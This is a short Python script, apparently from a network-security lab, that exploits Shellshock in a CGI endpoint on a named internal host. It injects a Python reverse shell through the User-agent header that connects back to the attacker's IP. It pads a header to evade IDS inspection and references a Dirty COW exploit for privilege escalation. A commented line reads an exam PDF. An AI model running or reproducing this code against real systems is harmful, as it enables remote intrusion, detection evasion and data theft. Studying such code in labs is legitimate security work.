import requests
from collections import OrderedDict
import numpy as np
import socket
from threading import Thread
import SimpleHTTPServer
import SocketServer


#dirtycow_url = "https://www.exploit-db.com/download/40616"
dirtycow_url = "http://10.2.136.121:8000/dirtycow.c"
own_ip = "10.2.136.121"
victim_ip = "10.2.142.226"
reverse_shell_port = 1234

url = 'http://10.2.142.226/cgi-bin/index.cgi'
long_header = range(1,1)
np.random.shuffle(long_header)
long_header = map(str,long_header)
long_header = ''.join(long_header) # Long header to evade ids depth inspection
#print(long_header)
#shellcode =  '() { :; }; echo \"Content-Type: text/plain\"; echo \"\"; echo \"\"; /bin/cat /home/netsec/course/exam.pdf'
shellcode = "() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ own_ip +"\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
print(shellcode)
s = requests.session()
s.headers = OrderedDict([('Accept-Language',long_header),('User-agent',shellcode)])
r = s.get(url)
print(r.text)

